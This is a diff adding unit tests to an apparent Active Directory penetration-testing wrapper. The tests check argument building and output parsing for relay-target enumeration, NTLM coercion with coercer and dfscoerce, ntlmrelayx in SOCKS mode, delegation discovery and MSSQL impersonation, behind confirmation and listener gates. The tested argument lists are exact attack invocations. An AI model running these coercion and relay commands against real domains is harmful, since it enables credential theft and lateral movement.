@@ -46,6 +46,84 @@ ok('roast kerberoast builds GetUserSPNs', () => { const b = ad.buildArgs('roast'
 ok('roast asrep builds GetNPUsers', () => { const b = ad.buildArgs('roast', '10.0.0.5', { asrep: true, domain: 'corp.local', userlist: '/tmp/u.txt' }); assert.strictEqual(b.bin, 'impacket-GetNPUsers'); assert.ok(b.args.includes('-usersfile')); });
 ok('adcs builds certipy find -vulnerable', () => { const b = ad.buildArgs('adcs', '10.0.0.5', { user: 'u', domain: 'corp.local' }); assert.strictEqual(b.bin, 'certipy'); assert.deepStrictEqual(b.args.slice(0, 2), ['find', '-u']); assert.ok(b.args.includes('-vulnerable')); });
 
+// ---- P0: relayability / coercion / delegation / mssql (auto) ----------------
+ok('enum-relay builds netexec --gen-relay-list', () => {
+  const b = ad.buildArgs('enum-relay', '10.0.0.0/24', {});
+  assert.strictEqual(b.bin, 'netexec');
+  assert.deepStrictEqual(b.args.slice(0, 2), ['smb', '10.0.0.0/24']);
+  assert.ok(b.args.includes('--gen-relay-list'));
+});
+ok('enum-coerce builds read-only fingerprint modules', () => {
+  const b = ad.buildArgs('enum-coerce', '10.0.0.5', {});
+  assert.strictEqual(b.bin, 'netexec');
+  assert.ok(b.args.includes('-M'));
+  for (const m of ['spooler-target', 'petitpotam', 'dfss']) assert.ok(b.args.includes(m), `module ${m}`);
+  assert.ok(!JSON.stringify(b.args).match(/coerce|relayx/i), 'no coercion/relay action in args');
+});
+ok('enum-delegation builds impacket-findDelegation', () => {
+  const b = ad.buildArgs('enum-delegation', '10.0.0.5', { domain: 'corp.local', user: 'u' });
+  assert.strictEqual(b.bin, 'impacket-findDelegation');
+});
+ok('enum-mssql builds netexec mssql audit', () => {
+  const b = ad.buildArgs('enum-mssql', '10.0.0.5', {});
+  assert.strictEqual(b.bin, 'netexec');
+  assert.strictEqual(b.args[0], 'mssql');
+  assert.ok(b.args.includes('--users') && b.args.includes('--db'));
+});
+ok('coerce/relay buildArgs refuse without listener', () => {
+  assert.strictEqual(ad.buildArgs('coerce', '10.0.0.5', {}), null);
+  assert.strictEqual(ad.buildArgs('relay', '10.0.0.5', {}), null);
+});
+ok('coerce buildArgs: fallback coercer quando impacket-dfscoerce manca (which iniettabile)', () => {
+  const c = ad.buildArgs('coerce', '10.0.0.5', { listener: '10.0.0.9:9999', user: 'u', passRef: 'P', which: (b) => b === 'coercer' });
+  assert.strictEqual(c.bin, 'coercer');
+  assert.deepStrictEqual(c.args, ['coerce', '-t', '10.0.0.5', '-l', '10.0.0.9', '-u', 'u', '-p', 'P', '--always-continue']);
+  const anon = ad.buildArgs('coerce', '10.0.0.5', { listener: '10.0.0.9:9999', which: (b) => b === 'coercer' });
+  assert.ok(anon.args.includes('--no-pass'), 'senza credenziali: --no-pass, mai prompt interattivo');
+  const d = ad.buildArgs('coerce', '10.0.0.5', { listener: '10.0.0.9:9999', which: (b) => b === 'impacket-dfscoerce' });
+  assert.strictEqual(d.bin, 'impacket-dfscoerce', 'build operator-supplied ha la precedenza');
+  const none = ad.buildArgs('coerce', '10.0.0.5', { listener: '10.0.0.9:9999', which: () => false });
+  assert.strictEqual(none, null, 'nessun coercer installato: fail-closed');
+});
+ok('relay buildArgs: SOCKS only, no dump/write flags ever', () => {
+  const b = ad.buildArgs('relay', '10.0.0.5', { listener: '127.0.0.1:9999' });
+  assert.strictEqual(b.bin, 'impacket-ntlmrelayx');
+  const s = b.args.join(' ');
+  assert.ok(s.includes('-socks'), 'default SOCKS mode');
+  assert.ok(!/--dump|--wa |--add-computer|write/i.test(s), 'no dump/write flags');
+  assert.ok(s.includes('-tf'), 'targets file from enum-relay');
+});
+
+// ---- P0 parsers --------------------------------------------------------------
+ok('parseCoerceModules flags vulnerable spooler', () => {
+  const rows = ad.parseCoerceModules('SMB  10.0.0.5  445  DC01  [+] spooler-target: vulnerable\nSMB  10.0.0.6  445  PC02  [-] petitpotam: not vulnerable');
+  assert.strictEqual(rows.length, 2);
+  assert.strictEqual(rows[0].host, '10.0.0.5');
+  assert.strictEqual(rows[0].machine, 'spoolsv');
+  assert.strictEqual(rows[0].vulnerable, true);
+  assert.strictEqual(rows[1].machine, 'efs');
+  assert.strictEqual(rows[1].vulnerable, false);
+});
+ok('parseFindDelegation extracts rbcd/constrained', () => {
+  const d = ad.parseFindDelegation('Account Name: svc-web\nConstrained w/ Protocol Transition\nAccount Name: winrm-srv\nResource-Based Constrained Delegation');
+  assert.strictEqual(d.length, 2);
+  assert.strictEqual(d[0].account, 'svc-web');
+  assert.strictEqual(d[0].type, 'constrained');
+  assert.strictEqual(d[0].protocol_transition, true);
+  assert.strictEqual(d[1].type, 'rbcd');
+});
+ok('parseMssqlAudit extracts dbs + impersonation', () => {
+  const a = ad.parseMssqlAudit('catalog: master\ncatalog: msdb\nUser \'svc_sql\' can impersonate: \'sa\'');
+  assert.deepStrictEqual(a.dbs, ['master', 'msdb']);
+  assert.strictEqual(a.impersonatable[0].user, 'svc_sql');
+  assert.strictEqual(a.impersonatable[0].as, 'sa');
+});
+ok('enum-relay signing=False lands in relay_targets', () => {
+  const hosts = ad.parseNxcSmbBanner('SMB  10.0.0.5  445  DC01  [*] Windows Server 2019 (signing:False)\nSMB  10.0.0.6  445  PC02  [*] Windows 10 (signing:True)');
+  const relayable = hosts.filter((h) => h.signing === false);
+  assert.deepStrictEqual(relayable.map((h) => h.ip), ['10.0.0.5']);
+});
+
 // ---- parsers ----------------------------------------------------------------
 const NXC_BANNER = 'SMB  10.0.0.5  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:corp.local) (signing:False) (SMBv1:True)';
 ok('parseNxcSmbBanner extracts signing/domain', () => {
@@ -103,6 +181,54 @@ ok('parsePolicy extracts lockout threshold', () => {
     assert.strictEqual(res.ok, false);
     assert.strictEqual(res.stage, 'tier');
     assert.strictEqual(ran, false, 'confirm-tier op must NOT run without --confirm');
+  });
+
+  await okA('runAd enum-relay parses relay map (auto tier)', async () => {
+    const res = await ad.runAd('enum-relay', '10.0.0.5', {
+      runAd: async () => ({ status: 0, stdout: NXC_BANNER }),
+    });
+    assert.strictEqual(res.ok, true);
+    assert.strictEqual(res.tier, 'auto');
+    assert.strictEqual(res.parsed.relay_targets.length, 1);
+    assert.strictEqual(res.parsed.relay_targets[0].signing, false);
+    assert.ok(res.parsed._relay_map, 'relay map persisted to reports/ad');
+  });
+
+  await okA('runAd coerce refuses WITHOUT --confirm (tier before listener)', async () => {
+    let ran = false;
+    const res = await ad.runAd('coerce', '10.0.0.5', { listener: '127.0.0.1:9999', runAd: async () => { ran = true; return { status: 0, stdout: '' }; } });
+    assert.strictEqual(res.ok, false);
+    assert.strictEqual(res.stage, 'tier');
+    assert.strictEqual(ran, false);
+  });
+
+  await okA('runAd coerce/relay refuse without listener (anti-spray gate)', async () => {
+    const c = await ad.runAd('coerce', '10.0.0.5', { confirm: 'lab', runAd: async () => ({ status: 0, stdout: '' }) });
+    assert.strictEqual(c.ok, false);
+    assert.strictEqual(c.stage, 'listener');
+    const r = await ad.runAd('relay', '10.0.0.5', { confirm: 'lab', runAd: async () => ({ status: 0, stdout: '' }) });
+    assert.strictEqual(r.ok, false);
+    assert.strictEqual(r.stage, 'listener');
+  });
+
+  await okA('runAd relay refuses when listener is NOT registered in sessions ledger', async () => {
+    process.env.SESSIONS_JSON = path.join(tmp, 'sessions-empty.json');
+    const res = await ad.runAd('relay', '10.0.0.5', { confirm: 'lab', listener: '127.0.0.1:9999', runAd: async () => ({ status: 0, stdout: '' }) });
+    assert.strictEqual(res.ok, false);
+    assert.strictEqual(res.stage, 'listener');
+    delete process.env.SESSIONS_JSON;
+  });
+
+  await okA('runAd relay runs with confirm + registered listener, logs SOCKS session', async () => {
+    const sessFile = path.join(tmp, 'sessions.json');
+    fs.writeFileSync(sessFile, JSON.stringify({ sessions: { lst1: { status: 'open', host: '127.0.0.1:9999' } } }));
+    process.env.SESSIONS_JSON = sessFile;
+    const res = await ad.runAd('relay', '10.0.0.5', { confirm: 'lab', listener: '127.0.0.1:9999', runAd: async () => ({ status: 0, stdout: '' }) });
+    assert.strictEqual(res.ok, true);
+    const reg = JSON.parse(fs.readFileSync(sessFile, 'utf8'));
+    const socks = Object.values(reg.sessions).filter((s) => s.type === 'ntlmrelayx-socks');
+    assert.strictEqual(socks.length, 1, 'relay SOCKS session recorded in teardown ledger');
+    delete process.env.SESSIONS_JSON;
   });
 
   await okA('runAd roast returns crackable hashes for the loot loop', async () => {
